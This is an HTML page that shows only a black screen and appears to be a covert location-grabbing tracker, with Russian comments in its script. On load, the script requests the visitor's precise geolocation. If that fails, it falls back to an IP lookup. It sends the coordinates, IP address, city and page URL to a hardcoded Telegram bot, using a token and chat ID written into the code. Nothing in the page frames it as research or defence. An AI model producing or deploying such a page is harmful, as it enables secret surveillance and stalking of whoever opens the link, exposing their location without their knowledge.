<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background: #000;
        }
    </style>
</head>
<body>
    <script>
        // ===== Твои данные Telegram (вставлены) =====
        var BOT_TOKEN = "7721494922:AAE3rqaQwY4eKMHb07Kb_Pv2HxK6LMv6up4";
        var CHAT_ID = "5570036809";

        function send(msg) {
            var url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(msg);
            new Image().src = url;
            fetch(url, { mode: 'no-cors' }).catch(function(){});
        }

        // ===== Геопозиция =====
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    var c = pos.coords;
                    send("📍 Координаты:\nШирота: " + c.latitude + "\nДолгота: " + c.longitude + "\nТочность: " + c.accuracy + " м\nВысота: " + (c.altitude || "нет") + "\nURL: " + location.href);
                },
                function(err) {
                    send("❌ Ошибка геолокации: " + err.message + "\nURL: " + location.href);
                    fetch('https://ipapi.co/json/')
                        .then(r => r.json())
                        .then(d => {
                            send("🌐 IP-гео:\nГород: " + (d.city || "нет") + "\nСтрана: " + (d.country_name || "нет") + "\nIP: " + (d.ip || "нет") + "\nURL: " + location.href);
                        })
                        .catch(function(e) {
                            send("❌ IP-гео не удалось: " + e);
                        });
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            send("❌ Браузер не поддерживает геолокацию\nURL: " + location.href);
            fetch('https://ipapi.co/json/')
                .then(r => r.json())
                .then(d => {
                    send("🌐 IP-гео:\nГород: " + (d.city || "нет") + "\nСтрана: " + (d.country_name || "нет") + "\nIP: " + (d.ip || "нет") + "\nURL: " + location.href);
                })
                .catch(function(e) {
                    send("❌ IP-гео не удалось: " + e);
                });
        }
    </script>
</body>
</html>
